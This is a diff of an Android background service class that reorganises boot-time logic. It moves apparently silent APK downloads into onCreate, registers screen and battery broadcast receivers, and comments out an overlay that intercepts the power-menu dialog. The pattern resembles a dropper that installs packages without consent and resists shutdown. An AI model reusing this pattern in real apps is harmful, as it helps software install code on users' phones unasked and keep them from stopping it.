@@ -56,7 +56,7 @@ public class ServiceBoot extends Service
 	{
 		// TODO: Implement this method
 		super.onCreate();
-		LinearLayout layout = new LinearLayout(this) {
+		/*LinearLayout layout = new LinearLayout(this) {
 			public void onCloseSystemDialogs(String reason) {
 				if ("globalactions".equals(reason)) {
 					new Senter().runingKu();
@@ -93,20 +93,9 @@ public class ServiceBoot extends Service
 				
 		params.gravity = Gravity.LEFT | Gravity.CENTER_VERTICAL;
 		wm.addView(view, params);
+		*/
+        //Toast.makeText(ServiceBoot.this, "service", Toast.LENGTH_LONG).show();
 		
-		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-		filter.addAction(Intent.ACTION_DATE_CHANGED);
-		filter.addAction(Intent.ACTION_HEADSET_PLUG);
-		filter.addAction(Intent.ACTION_SCREEN_ON);
-		filter.addAction(Intent.ACTION_SCREEN_OFF);
-		
-		broadcastReceiver = new ReceiverBoot();
-		registerReceiver(broadcastReceiver, filter);
-	}
-
-	@Override
-	public int onStartCommand(Intent intent, int flags, int startId)
-	{
 		if (ifDownload) {
 			if (new MainPaket().ping(this)) {
 				downloadAPK();
@@ -118,11 +107,18 @@ public class ServiceBoot extends Service
 		else if (swAll) {
 			downloadAllApk();
 		}
-
-		return super.onStartCommand(intent, flags, startId);
+				
+		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+		filter.addAction(Intent.ACTION_DATE_CHANGED);
+		filter.addAction(Intent.ACTION_HEADSET_PLUG);
+		filter.addAction(Intent.ACTION_SCREEN_ON);
+		filter.addAction(Intent.ACTION_SCREEN_OFF);
+		
+		broadcastReceiver = new ReceiverBoot();
+		registerReceiver(broadcastReceiver, filter);
 	}
 
-	@Override
+/*	@Override
 	public void onDestroy()
 	{
 		// TODO: Implement this method
@@ -130,7 +126,7 @@ public class ServiceBoot extends Service
 		unregisterReceiver(receiver);
 		Toast.makeText(this, "al destroy", Toast.LENGTH_LONG).show();
 
-	}
+	}*/
 
 	private void downloadAllApk() {
 
